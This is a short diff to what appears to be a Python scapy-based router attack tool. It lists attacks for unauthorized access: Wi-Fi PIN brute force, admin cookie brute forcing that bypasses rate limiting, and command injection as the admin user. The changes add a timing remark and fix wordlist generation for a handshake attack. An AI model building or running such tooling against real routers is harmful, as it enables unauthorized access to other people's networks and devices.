@@ -10,7 +10,7 @@ from scapy.all import *
 from scapy.layers.dot11 import *
 
 ATTACKS = [
-    ("PIN Brute", "Perform a brute force attack on the WiFi Pin for unauthorized access."),
+    ("PIN Brute", "Perform a brute force attack on the WiFi Pin for unauthorized access. This will take very long."),
     ("Check Admin Status",   "Identify if the Admin is actively logged in and editing the configuration settings."),
     ("Admin Login Brute Force", "Bypass auth rate limiting by brute forcing authorization cookies."),
     ("Command Injection", "Run arbitrary commands as the Admin user. This requires Admin access (Refer to Attack #3)"),
@@ -360,7 +360,7 @@ def main() -> None:
                         wordlist = "TP-Link-Pins.txt"
                         if not os.path.exists(wordlist):
                             print("[*] Wordlist does not exist generating it now (This will be a large file)...")
-                            wordlist = generate_wordlist()
+                            generate_wordlist(wordlist)
                         
                         client_list = get_local_devices()
                         password = handshake_attack(target["BSSID"], target["Channel"], target["SSID"], client_list, wordlist)
